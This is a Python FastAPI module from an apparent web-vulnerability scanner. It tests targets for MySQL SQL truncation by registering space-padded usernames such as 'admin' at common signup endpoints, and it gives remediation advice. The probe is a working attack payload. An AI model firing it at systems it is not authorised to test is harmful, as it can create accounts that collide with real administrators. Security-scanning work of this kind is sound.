"""sql_truncation_attack — MySQL strict-mode SQL truncation attack.

Classic 2008 attack (still works in non-strict MySQL): if username column
is VARCHAR(32) + non-strict mode, registering 'admin           x' truncates
to 'admin' on insert, but the trailing 'x' bypasses uniqueness check.
Now there's an attacker 'admin' that collides with the real admin.

Probe: try registering with overlong usernames containing existing-admin
prefixes; success indicator is HTTP 200/201 vs 409/400 conflict.
"""
import json
from fastapi import APIRouter, Depends
from tools._shared import (ScanRequest, verify_scan_quota, web_url,
                            safe_request, wrap_finding, standard_response)
from tools._vl_core.turbo import vl_turbo
from tools._vl_core.verify import vl_verify

router = APIRouter()
SIGNUP_PATHS = ["/api/register", "/api/signup", "/register",
                 "/api/users", "/api/v1/users"]
LONG_NAMES = [
    "admin" + " " * 60 + "x",
    "administrator" + " " * 60 + "x",
    "root" + " " * 60 + "x",
]


@router.post("/api/webapp/scan/sql_truncation_attack")
@vl_turbo()
@vl_verify()
def scan_sql_truncation_attack(req: ScanRequest, payload=Depends(verify_scan_quota)):
    base = web_url(req.target).rstrip("/")
    suspicious = []
    tested = 0
    for path in SIGNUP_PATHS:
        url = base + path
        r0 = safe_request("OPTIONS", url,
            headers={"User-Agent": "VulnusLab/1.0"},
            req=req, timeout=6, allow_redirects=False)
        if r0 is None or r0.status_code == 404: continue
        for name in LONG_NAMES:
            r = safe_request("POST", url,
                headers={"Content-Type": "application/json",
                          "User-Agent": "VulnusLab/1.0"},
                data=json.dumps({"username": name,
                                   "email": f"vulnuslab-{hash(name) & 0xFFFF}@test.local",
                                   "password": "Vu1nuslab!Pass"}),
                req=req, timeout=8, allow_redirects=False)
            if r is None: continue
            tested += 1
            # Success indicator: registration accepted (200/201)
            if r.status_code in (200, 201):
                suspicious.append({"path": path, "name": name[:30] + "...",
                                     "status": r.status_code})
                break
    findings = []
    if suspicious:
        findings.append(wrap_finding(
            f"Possible SQL truncation attack at {len(suspicious)} endpoint(s)",
            "MEDIUM", cvss="5.3", cwe="CWE-89", owasp="A03:2021",
            remediation="Set MySQL sql_mode='STRICT_TRANS_TABLES' (rejects "
                        "truncating INSERT). Or trim username + validate length "
                        "in application layer BEFORE INSERT. Worst case: "
                        "attacker registers 'admin' alias that collides on "
                        "password-reset / SSO link.",
            evidence_marker=" | ".join(
                f"{s['path']}: '{s['name']}' → HTTP {s['status']}"
                for s in suspicious[:3]
            )))
    elif tested > 0:
        findings.append(wrap_finding(
            f"SQL truncation rejected at {tested} signup attempt(s)",
            "POSITIVE", cwe="CWE-89", remediation="Maintain.",
            evidence_marker=f"{tested} long-name signups rejected"))
    else:
        return standard_response(
            tool="sql_truncation_attack", target=req.target, findings=[],
            tests_performed=0, vulnerable=False,
            skipped_reason="No signup endpoints found")
    return standard_response(
        tool="sql_truncation_attack", target=req.target, findings=findings,
        tests_performed=tested, vulnerable=bool(suspicious),
        tests_summary=f"{tested} signups, {len(suspicious)} accepted",
        raw_data={"suspicious": suspicious})


def register(app):
    app.include_router(router)
